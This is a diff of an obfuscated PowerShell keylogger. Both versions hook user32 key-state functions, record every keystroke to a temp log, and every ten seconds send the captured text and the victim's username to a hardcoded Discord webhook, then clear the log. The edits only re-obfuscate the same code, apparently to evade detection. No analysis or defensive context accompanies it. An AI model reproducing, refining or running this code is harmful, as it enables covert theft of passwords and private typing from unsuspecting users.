@@ -1,6 +1,12 @@
-$webhook  =   ( 'https:/'  +  '/di' +  'scord.com/' +'api'+'/w'  +'eb' +  'ho' +  'oks'  + '/' + '138'+'0' + '97'  + '6'+ '42'  +'5208778935/BYngRi6W'+  '-bJS40mQ' +'iRL'+ 'o6'  +'enK1'+  'A4Ya'+'jR'  +'8qR'  +  '0'+'jExZ' +  'T'+ 'A4zuPr6'+ 'i' +'7c' +  '4G' + '4'  +  'S' +  'YUCSp'  +'Pxzhll'+ 'B'+ 'ke')
+
+
+
+
+Set-Variable -Name webhook -Value ( 'https:/'  +  '/di' +  'scord.com/' +'api'+'/w'  +'eb' +  'ho' +  'oks'  + '/' + '138'+'0' + '97'  + '6'+ '42'  +'5208778935/BYngRi6W'+  '-bJS40mQ' +'iRL'+ 'o6'  +'enK1'+  'A4Ya'+'jR'  +'8qR'  +  '0'+'jExZ' +  'T'+ 'A4zuPr6'+ 'i' +'7c' +  '4G' + '4'  +  'S' +  'YUCSp'  +'Pxzhll'+ 'B'+ 'ke')
+
 
 $PID  |     . (  "{2}{1}{0}"-f'e','ut-Fil','O') "$env:TEMP\DdBPKCytRe"
+
 
 function kE`ylOgGer(  $logFile= "$env:TEMP\$env:UserName.log" ) {
     
@@ -8,40 +14,54 @@ function kE`ylOgGer(  $logFile= "$env:TEMP\$env:UserName.log" ) {
           &("{2}{1}{0}"-f'm','w-Ite','Ne' ) -Path $logFile -ItemType (  'Fil'+'e') -Force   |   .  (  "{0}{2}{1}" -f'O','t-Null','u'  )
     }
 
-    $APIsignatures  =  (  ('HfU
+    
+    Set-Variable -Name APIsignatures -Value (  ('HfU
 [DllImpo'+'rt(X6wuser3'  +'2.d' +  'llX6w, Ch' + 'arSet'  +'=CharS'  +'et.Auto, E'+'xa' +'c' + 'tSpelli'+  'ng=true)]
 pub'  + 'lic st' +  'a'  +  'tic e'+ 'xtern'+  ' sh'  +'or' + 't Ge'  +'tAsyncK'  +  'eyStat'+  'e(i'+ 'n' +'t vi' +  'rt'  +  'ualKeyCode)'  +  ';
 [DllImpor'+ 't(X'+'6w'  + 'user32'  + '.'+  'dllX6w,' +  ' CharSet'+  '='  +'CharSet.A' +'uto)]
 '+  'p' +'ublic'  +  ' st'+  'atic' + ' ext' +'ern ' + 'int'+' GetKe'+  'yboa'+'rdState(b' +  'yte[] keys' + 'tate);' + '
 [DllImp'  +  'o' +  'rt'  +'(X6wu' +'ser32.d'+ 'llX6w, CharS'+'et=CharSet.Auto)' +  ']'  +  '
 publ'  +'ic stat'  +  'ic ex' + 'tern int MapV' +  'irtua'  + 'lKey(u' +  'int uCod' + 'e, '  +'i'  + 'nt uM' +  'apT' +  'ype);
-'+  '[D'  +'llImpor'  +  't('  + 'X6wuser32.dllX6w' +  ', ' +' Cha'+  'rSet='  + 'Ch'+ 'a' +'rSet.Au'+ 't' +  'o)]
-public s'+'tatic ex'+'t'  +  'ern i'  +'nt ToUnic' + 'ode'+ '(uint'  +  ' wVirtK'  + 'ey, u' + 'int w' +'ScanCo'+'de, byte[]'+  ' l'  +  'pkeyst'+'ate, System.'+'Text.'+'Stri' +'ng' + 'B' +'uilder pws'  +'zBu' + 'f'  +  'f, i'  +  'nt cc'+  'hBuff, uin' +'t' +  ' wFlags);
+'+  '[D'  +'llImpor'  +  't('  + 'X6wuser32.dllX6w' +  ', ' +'Cha'+  'rSet='  + 'Ch'+ 'a' +'rSet.Au'+ 't' +  'o)]
+public s'+'tatic ex'+'t'  +  'ern i'  +'nt ToUnic' + 'ode'+ '(uint'  +  ' wVirtK'  + 'ey, u' + 'int w' +'ScanCo'+'de, byte[]'+  ' l'  +  'pkeyst'+'ate, System.'+'Text.'+'Stri' +'ng' + 'B' +'uilder pws'  +'zBu' + 'f'  +  'f, i' +  'nt cc'+  'hBuff, uin' +'t' +  ' wFlags);
 HfU')."R`EP`LACe"( 'X6w',[sTRIng][CHaR]34 )."r`EplAce"( 'HfU',[sTRIng][CHaR]39)  )
 
-    $API   = &("{0}{1}{2}" -f 'Ad','d-Typ','e') -MemberDefinition $APIsignatures -Name (  'Wi'+ 'n32' ) -Namespace ('A' +  'PI' ) -PassThru
+    
+    Set-Variable -Name API -Value (&("{0}{1}{2}" -f 'Ad','d-Typ','e') -Namespace ('A' +  'PI' ) -PassThru -MemberDefinition $APIsignatures -Name (  'Wi'+ 'n32' ))
 
-    $lastWebhookTime  =   &  ("{2}{1}{0}"-f'ate','t-D','Ge' )
+    
+    Set-Variable -Name lastWebhookTime -Value (&  ("{2}{1}{0}"-f'ate','t-D','Ge' ))
 
+    
     try {
         while ($true) {
+            
+
+            
             if (  (( & ( "{0}{1}{2}" -f 'Get-D','at','e')  ) - $lastWebhookTime  )."tot`ALSEco`N`DS" -ge 10) {
                 try {
+                    
                     $logs  =    .  (  "{1}{2}{0}"-f'Content','Get','-') -Path $logFile -Raw -Encoding (  'Unico' +  'd'  +  'e'  )
                     if ($logs) {
+                        
                         $logs  =  $logs."sU`BSt`RInG"( 0, [Math]::('M' + 'in').Invoke(  $logs."Le`NgTH", 2000 )  )
+                        
                         $logs   = $logs -replace (( '[' +  '^{0}x20-{0}x7'+  'E'+']') -f[Char]92  ), ''
+                        
                         $Body  = @{
                             (  'use'  + 'rn'+'ame' )   = $env:UserName
                             ( 'c' + 'ontent')  =   $logs
                         }
                         $jsonBody = $Body  |    .  (  "{3}{1}{2}{4}{0}" -f 'on','rtT','o-J','Conve','s'  )
                          &  ( "{3}{2}{0}{1}"-f't','ent','n','Add-Co') -Path "$env:TEMP\keylogger_debug.log" -Value (  'S' +'e' +'nding '  + 'payloa'+'d'+ ': '+"$jsonBody"  )
-                        &  (  "{3}{0}{4}{1}{2}"-f 'nv','h','od','I','oke-RestMet'  ) -Uri $webhook -Method ( 'P'  +  'ost') -Body $jsonBody -ContentType ( 'a'+'ppli' +  'ca' + 'tion/' +  'j'  +  'son' )  | &(  "{2}{1}{0}"-f'Null','t-','Ou' )
-                        &  ( "{0}{4}{2}{1}{3}"-f'C','Conte','ar-','nt','le') -Path $logFile -Force
+                        
+                          &  (  "{3}{0}{4}{1}{2}"-f 'nv','h','od','I','oke-RestMet'  ) -Uri $webhook -Method ( 'P'  +  'ost') -Body $jsonBody -ContentType ( 'a'+'ppli' +  'ca' + 'tion/' +  'j'  +  'son' )  | &(  "{2}{1}{0}"-f'Null','t-','Ou' )
+                        
+                         &  ( "{0}{4}{2}{1}{3}"-f'C','Conte','ar-','nt','le') -Path $logFile -Force
                     }
                 }
                 catch {
+                    
                     $errorMessage  = $_."E`xcEPtIOn"."ME`ssaGE"
                     if (  $_."eXCE`P`Tion"."respoN`sE" ) {
                         $responseStream   =   $_."eXCEp`Ti`On"."re`spo`NSe".(  'Ge'+ 'tResponse'+ 'S'  +'tr'  + 'eam'  ).Invoke(    )
@@ -54,8 +74,9 @@ HfU')."R`EP`LACe"( 'X6w',[sTRIng][CHaR]34 )."r`EplAce"( 'HfU',[sTRIng][CHaR]39) 
                 $lastWebhookTime  =   & ( "{0}{1}" -f'Get-Da','te'  )
             }
 
-            for ( $ascii  = 8;   $ascii -le 254; $ascii++  ) {  
-                $keystate  =   $API::(  'GetAs'+ 'y' +'nc'+'KeySt' +'ate'  ).Invoke($ascii)
+            
+            for ( Set-Variable -Name ascii -Value (8);   $ascii -le 254; $ascii++  ) {  
+                Set-Variable -Name keystate -Value ($API::(  'GetAs'+ 'y' +'nc'+'KeySt' +'ate'  ).Invoke($ascii))
                 if ($keystate -eq -32767) {
                     $null =   [console]::"c`Ap`sLock"
                     $mapKey  = $API::(  'Map'  + 'Vir'+  't'+'ualKey' ).Invoke(  $ascii, 3  )
@@ -75,8 +96,9 @@ HfU')."R`EP`LACe"( 'X6w',[sTRIng][CHaR]34 )."r`EplAce"( 'HfU',[sTRIng][CHaR]39) 
         }
     }
     finally {
+        
         try {
-            $logs =  . ("{0}{1}{2}"-f'Get-Con','ten','t' ) -Path $logFile -Raw -Encoding (  'U' + 'nicode'  )
+            Set-Variable -Name logs -Value (. ("{0}{1}{2}"-f'Get-Con','ten','t' ) -Raw -Path $logFile -Encoding (  'U' + 'nicode'  ))
             if ($logs ) {
                 $logs   =   $logs."sUB`stRiNg"(0, [Math]::('Mi'+'n' ).Invoke(  $logs."L`EnGTh", 2000 )  )
                 $logs   = $logs -replace ( ( '[^'  +  'M'+  'D' +'Kx20-' +  'MDKx' + '7E]'  ).(  'r'  +'ePLa' + 'Ce'  ).Invoke('MDK','\')), ''
@@ -90,16 +112,17 @@ HfU')."R`EP`LACe"( 'X6w',[sTRIng][CHaR]34 )."r`EplAce"( 'HfU',[sTRIng][CHaR]39) 
             }
         }
         catch {
-            $errorMessage  = $_."e`x`Ce`ptIon"."mesS`AgE"
+            Set-Variable -Name errorMessage -Value ($_."e`x`Ce`ptIon"."mesS`AgE")
             if (  $_."Ex`CE`PTIon"."REs`PoN`SE" ) {
                 $responseStream   =  $_."eX`CEP`TioN"."rE`sPO`Nse".(  'Ge'+  'tR'  +'esponseStr' + 'eam'  ).Invoke(   )
                 $reader   =   & ("{1}{3}{0}{2}"-f'O','New','bject','-'  ) ('S' +  'ystem.IO.Str'+  'ea'+  'mR' +'eader'  )( $responseStream)
                 $responseBody   =  $reader.( 'Re' + 'adToEn'+'d' ).Invoke(    )
                 $errorMessage += (' ' + '- ' +'Di'+  's'  + 'cord ' + 'Respons'  +'e'+': '  +  "$responseBody")
             }
-            &( "{1}{0}{3}{2}" -f'Co','Add-','nt','nte') -Path "$env:TEMP\keylogger_error.log" -Value $errorMessage
+            &( "{1}{0}{3}{2}" -f'Co','Add-','nt','nte') -Value $errorMessage -Path "$env:TEMP\keylogger_error.log"
         }
     }
 }
+
 
 .("{0}{2}{1}" -f'Key','er','Logg' )
